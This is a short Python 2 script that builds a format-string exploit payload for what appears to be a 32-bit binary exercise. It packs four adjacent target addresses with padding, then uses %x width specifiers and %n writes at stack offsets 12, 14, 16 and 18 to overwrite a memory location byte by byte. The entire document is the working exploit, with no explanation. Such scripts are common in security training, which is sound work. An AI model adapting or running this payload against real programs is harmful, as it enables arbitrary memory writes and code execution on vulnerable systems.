import struct

target1 = struct.pack("<I", 0x080496f4)
target2 = struct.pack("<I", 0x080496f5)
target3 = struct.pack("<I", 0x080496f6)
target4 = struct.pack("<I", 0x080496f7)

tarsum = target1 + "AAAA" + target2 + "AAAA" + target3 + "AAAA" + target4
exploit = tarsum + "%39x " + "%12$n " + "%15x " + "%14$n " + "%171x " + "%16$n " + "%253x " + "%18$n "

print exploit
